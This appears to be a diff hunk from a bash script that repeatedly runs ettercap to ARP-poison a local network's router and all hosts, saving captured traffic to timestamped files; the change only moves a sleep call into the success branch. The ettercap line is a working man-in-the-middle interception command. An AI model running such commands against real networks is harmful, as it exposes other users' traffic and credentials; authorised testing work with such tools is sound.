@@ -88,12 +88,10 @@ function intercept {
         ettercap -Tqi $interface -M arp:remote /$router_ip// /// -s 's(300)qq' -P autoadd -j $tmp_file -w $store_folder/sniffing_$time_stamp.cap;
     if [[ $? == 0 ]]; then
         log "Interception has finished successfully.";
+        sleep $interval;
     else
         error "Interception has run through errors.";
     fi
-
-    sleep $interval;
-
     done
     return 0;
 }
